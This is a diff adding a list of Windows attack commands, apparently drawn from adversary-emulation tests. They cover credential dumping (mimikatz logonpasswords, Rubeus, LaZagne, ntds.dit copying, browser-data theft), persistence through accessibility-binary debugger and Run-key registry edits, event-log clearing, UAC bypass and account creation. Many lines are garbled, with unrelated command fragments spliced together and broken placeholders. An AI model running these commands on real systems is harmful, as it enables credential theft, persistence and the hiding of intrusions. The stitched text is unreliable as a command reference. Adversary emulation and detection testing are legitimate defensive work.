@@ -1,0 +1,64 @@
+icacls c : \users\
+.\outflank-dumpert.exe dump
+new-item -path `` hkcu : shadow software\classes\clsid\ ( clear-eventlog clear-eventlog -r /user : $ { ads_zip } -o $ { command }
+adfind.exe -f ( objectcategory=computer )
+sc query
+copy-item `` $ shortcutlocation c : account logon '' /v `` ' '' '' \windows\system32\sethc.exe
+wmic process list | findstr `` $ : disable | ' ' ) -class '__filtertoconsumerbinding ' , fullname , string : ' $ ( copy path } \windows\ntds\ntds.dit $ i -u $ profile
+cmdkey.exe /list
+pktmon.exe start -- etw
+dir c : \users\
+net group `` hklm\software\microsoft\windows \users\
+cmdkey /list
+debugger -l $ ( username `` $ { hkcu\software\microsoft\windows\currentversion\run '' \programdata\microsoft\windows\start \ $ { systeminfo.exe } \ $ -asplaintext 1 -enabled $ : path -p /add } -a `` ticket_output '' username= $ { ads_zip } rdp : rdp : $ { psexec.exe \\ $ {
+reg add `` hklm\software\microsoft\windows nt\currentversion\image file execution options\osk.exe '' -class activescripteventconsumer -class -command default )
+bitsadmin.exe /setnotifycmdline $ { path } binpath=
+del -executionpolicy team '' @ { binary_file_path }
+.\putty.exe
+reg add `` hkey_local_machine\software\microsoft\windows nt\currentversion\winlogon '' /v `` autorun '' '' /d `` $ { binary } ''
+net accounts
+net localgroup `` administrators '' '' c : \windows\system32\sethc.exe
+cmdkey /list
+net user /domain
+net user administrator /domain
+rundll32 popcalc.dll , popcalc
+set windir= '' $ { dump_type }
+net user $ true
+rdrleakdiag.exe /p $ target } . % domain }
+-c : \windows\system32\spool\tools\printbrm.exe -r -f $ { format }
+bypassuac.exe : # { lsass_pid }
+cmdkey /list
+quser
+reg add `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' /t reg_dword /d `` 1 '' /f
+net user $ { user_name } -l $ { command }
+icacls c : \users\
+wt.exe $ { wait_ms address }
+copy c : \windows\system32\sethc.exe /grant administrators : file '' `` $ { dump_file } -- dumptype $ ( ) .starttype select-object mainwindowtitle
+net user defaultaccount /active : yes
+reg add `` hklm\software\microsoft\windows nt\currentversion\image file execution options\spoolsv.exe '' -class -user /f
+lazagne.exe windows -mscache
+sharprdp.exe computername= % ip_address }
+cmdkey.exe /list
+net user administrator /add
+copy c : \users\ @ $ { ads_zip } -- ( $ ( psexec.exe \\ $ { remote_host } -u $ { day } /o
+tasklist
+net user administrator /domain
+net user administrator /domain
+$ shortcut.targetpath= '' '' )
+microsoft.nodejstools.pressanykey.exe /addfile $ { bits_job_name } $ { output_image_path }
+wmic process list | findstr `` $ { process_string }
+net localgroup administrators `` c : \windows\system32\sethc.exe /grant administrators : bits_job_name }
+sekurlsa : :logonpasswords
+.\rubeus.exe dump
+wscript $ { docx }
+get-localgroup
+rubeus.exe dump
+net user $ { bits_job_name } /y }
+icacls % \system32\osk.exe
+net user = @ $ { user_name } $ { command }
+hklm\software\microsoft\provisioning\commands\lolbin\dummy1 unload /v `` $ { service_name }
+hack-browser-data-windows-64bit.exe
+python archive_file.py $ { target_ip }
+$ shortcut = `` $ `` ( `` hkey_local_machine\software\microsoft\windows set objws = ( set objws = appdata % localappdata % appdata % ) \\ $ { -ne : -u $ { temp % | find `` hklm\system\currentcontrolset\services\winsock2\parameters '' /d `` 1 /f
+stordiag.exe
+whoami
